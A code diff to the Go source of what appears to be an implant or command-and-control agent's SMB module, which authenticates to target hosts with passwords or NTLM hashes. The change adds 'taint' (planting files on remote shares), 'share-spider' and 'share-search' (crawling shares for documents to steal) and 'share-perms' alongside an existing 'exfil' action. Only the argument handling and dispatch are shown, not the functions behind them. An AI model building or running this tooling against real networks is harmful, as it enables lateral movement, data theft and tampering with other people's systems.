@@ -1,7 +1,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -22,7 +21,7 @@ func (c *SmbCommand) Description() string {
 }
 
 type smbArgs struct {
-	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push
+	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push, taint
 	Host        string `json:"host"`        // target host
 	Share       string `json:"share"`       // share name (e.g., C$, ADMIN$, ShareName)
 	Path        string `json:"path"`        // file/directory path within share
@@ -33,7 +32,12 @@ type smbArgs struct {
 	Content     string `json:"content"`     // file content for upload action
 	Destination string `json:"destination"` // destination path for mv action
 	Source      string `json:"source"`      // local file path for push action
+	PlantName   string `json:"plant_name"`  // filename to plant on shares (for taint action)
 	Port        int    `json:"port"`        // SMB port (default: 445)
+	Depth       int    `json:"depth"`       // max recursion depth for spider/search (default: 3)
+	Extensions  string `json:"extensions"`  // comma-separated extension filter for spider (e.g., ".docx,.xlsx,.pdf")
+	Patterns    string `json:"patterns"`    // comma-separated filename patterns for search
+	MaxResults  int    `json:"max_results"` // max results to return (default: 500)
 }
 
 func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
@@ -41,9 +45,9 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: parameters required. Use -action <shares|ls|cat|upload|rm|mkdir|mv> -host <target> -username <user> -password <pass>")
 	}
 
-	var args smbArgs
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := unmarshalParams[smbArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 	defer zeroCredentials(&args.Password, &args.Hash)
 
@@ -52,7 +56,7 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push")
+		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search")
 	}
 
 	if args.Port <= 0 {
@@ -107,8 +111,22 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
 		}
 		return smbExfilFile(args)
+	case "taint":
+		if args.Source == "" && args.Content == "" {
+			return errorResult("Error: -source (local file to plant) or -content (inline content) required for taint action")
+		}
+		return smbTaintShares(args)
+	case "share-perms":
+		return smbSharePerms(args)
+	case "share-spider":
+		if args.Share == "" {
+			return errorResult("Error: -share required for share-spider action")
+		}
+		return smbShareSpider(args)
+	case "share-search":
+		return smbShareSearch(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil", args.Action)
+		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint, share-perms, share-spider, share-search", args.Action)
 	}
 }
 
@@ -141,7 +159,7 @@ const smbOperationTimeout = 30 * time.Second
 func smbConnect(args smbArgs) (*smbConn, error) {
 	session, conn, err := smbDialSession(args.Host, args.Port, args.Username, args.Domain, args.Password, args.Hash, smbOperationTimeout)
 	if err != nil {
-		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %v", args.Host, args.Domain, args.Username, err)
+		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %w", args.Host, args.Domain, args.Username, err)
 	}
 	return &smbConn{session: session, conn: conn}, nil
 }
